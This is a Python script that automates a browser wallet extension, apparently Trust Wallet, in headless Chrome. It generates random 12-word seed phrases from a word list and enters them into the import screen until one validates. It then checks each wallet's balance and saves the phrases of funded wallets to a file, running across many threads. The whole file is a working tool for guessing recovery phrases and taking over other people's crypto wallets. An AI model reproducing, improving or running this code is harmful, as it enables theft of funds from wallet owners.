import os
import time
import threading

try:
    from colorama import Fore, Back, Style
except:
    os.system("pip install colorama")
    from colorama import Fore, Back, Style

def getWallet():
    try:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys
    except:
        os.system("pip install selenium")
        from selenium import webdriver
        from selenium.webdriver.common.by import By

    finally:
        import random
        import data

    EXTENSION_PATH = data.extension_path
    EXTENSION_ID = data.extension_id

    chromeOption = webdriver.ChromeOptions()
    chromeOption.add_extension(EXTENSION_PATH)
    chromeOption.add_argument("--headless=new")
    driver = webdriver.Chrome(options=chromeOption)
    driver.implicitly_wait(20)

    try:
        def seedWords(num_words=12):
            with open("seed-phrases.txt", "r") as seeds:
                phrases = seeds.read()
                keys = phrases.splitlines()

            # Use random.sample to select num_words random words without repetition
            selected_words = random.sample(keys, num_words)

            return selected_words

        password = "Password@312"

        driver.get("chrome-extension://" + EXTENSION_ID + "/home.html#/onboarding/")

        time.sleep(1)
        driver.switch_to.window(driver.window_handles[1])
        driver.close()
        driver.switch_to.window(driver.window_handles[0])

        def importSeeds():
            driver.switch_to.window(driver.window_handles[0])

            # Click on Import
            driver.find_element(By.XPATH, value="/html/body/div/div/div[2]/div/div/div/div/div[3]/div").click()

            # Enter the password
            driver.find_element(By.XPATH, value="/html/body/div/div[2]/div/div/div[2]/form/div[1]/div/div/input").send_keys(password)
            driver.find_element(By.XPATH, value="/html/body/div/div[2]/div/div/div[2]/form/div[2]/div/div/input").send_keys(password)

            # Click on checkbox
            driver.find_element(By.XPATH, value="/html/body/div/div[2]/div/div/div[2]/form/div[3]/div/input").click()

            # click on submit
            driver.find_element(By.XPATH, value="/html/body/div/div[2]/div/div/div[2]/form/div[4]/div[2]/button").click()

            looper = True

            # INPUTE SEED WORDS
            while looper == True:

                words = seedWords()
                i = 1
                j = 0
                l = 1
                while i <= 12:
                    seed_phrases = " ".join(words[j:i])

                    if i <= 6:
                        driver.find_element(By.XPATH, value=f"/html/body/div/div/div/div[2]/div/div/div[2]/form/div[1]/div[2]/div[1]/div[{i}]/div/input").send_keys(seed_phrases)
                    elif i > 6 and i <= 12:
                        driver.find_element(By.XPATH, value=f"/html/body/div/div/div/div[2]/div/div/div[2]/form/div[1]/div[2]/div[2]/div[{l}]/div/input").send_keys(seed_phrases)
                        l += 1

                    i += 1
                    j += 1

                # IF Invalid
                try:
                    errorMsg = driver.find_element(By.XPATH, value="/html/body/div/div/div/div[2]/div/div/div[2]/form/div[1]/div[4]/div/div")
                    driver.find_element(By.XPATH, value="/html/body/div/div/div/div[2]/div/div/div[2]/form/div[1]/div[3]/div/button/p").click()
                    print(Fore.RED + f'INVALID: {" ".join(words)}')

                # IF Valid
                except:
                    looper = False
                    print(Fore.GREEN + f'VALID: {" ".join(words)}')
                    print(Fore.RESET + " ")

                    driver.find_element(By.XPATH, value="/html/body/div/div/div/div[2]/div/div/div[2]/form/div[2]/div[2]/button").click()  # Click on Next

                    # click on share data
                    driver.find_element(By.XPATH, value="/html/body/div/div[2]/div/div/div/div[2]/div[2]/button").click()

                    # click on open wallet
                    driver.find_element(By.XPATH, value="/html/body/div/div[2]/div/div/div/div[2]/div/button").click()

                    try:
                        driver.find_element(By.XPATH, value="/html/body/div[2]/div/div/div/div[2]/div/div/div[2]/div/div[5]/div/button").click()  # click on got it
                        driver.find_element(By.XPATH, value="/html/body/div[2]/div/div/div/div[2]/div/div/div[2]/div/div[5]/div/button").click()  # click on i am ready to use trust wallet
                    except:
                        pass
                    try:
                        getBal = driver.find_element(By.XPATH, value="/html/body/div/div[1]/div[2]/div[1]/div[1]/h2")  # check balance
                    except:
                        time.sleep(20)
                        getBal = driver.find_element(By.XPATH, value="/html/body/div/div[1]/div[2]/div[1]/div[1]/h2")
                    usd = float(getBal.text[1:])
                    if usd == 0:
                        print(Fore.CYAN + f'[${usd}] : {" ".join(words)} \n')
                        print(Fore.RESET + " ")
                        # with open("ValidWallets.txt", "a") as valid_Phrase:
                        #     valid_Phrase.write("[$" + str(usd) + "] : " + " ".join(words) + "\n")

                        # <================LOCK THE WALLET AND RESET==================>

                        driver.find_element(By.XPATH, value="/html/body/div/div[2]/div/div[4]").click()# click on settings

                        driver.find_element(By.XPATH, value="/html/body/div/div[1]/div[2]/div/div/div[15]/div[1]/div[2]/p[1]").click()# click on lock

                        driver.find_element(By.XPATH, value="/html/body/div/div/div/div[2]/div[2]/button/p").click()# click on reset
                        driver.find_element(By.XPATH, value="/html/body/div[2]/div/div/div/div[2]/div/div/div[2]/div/div[4]/div/button").click()# click on i understand and continue
                        time.sleep(1)
                        importSeeds()
                        
                    else:
                        print(Fore.GREEN + f'[${usd}] : {" ".join(words)} \n')
                        print(Fore.RESET + " ")
                        try:
                            with open("MoneyWallets.txt", "a") as valid_Phrase:
                                valid_Phrase.write("[$" + usd + "] : ", " ".join(words) + "\n")
                        except:
                            pass
        importSeeds()

    except Exception as error:
        print(Fore.BLUE + "ErrorMessage : ", Fore.RED, error)
        print(Fore.RESET + " ")
        driver.quit()
        getWallet()


if __name__ == '__main__':

    enteredThread = int(input("Enter Threads : "))
    currentThread = 1

    while currentThread <= enteredThread:
        th1 = threading.Thread(target=getWallet)
        th1.start()
        currentThread += 1
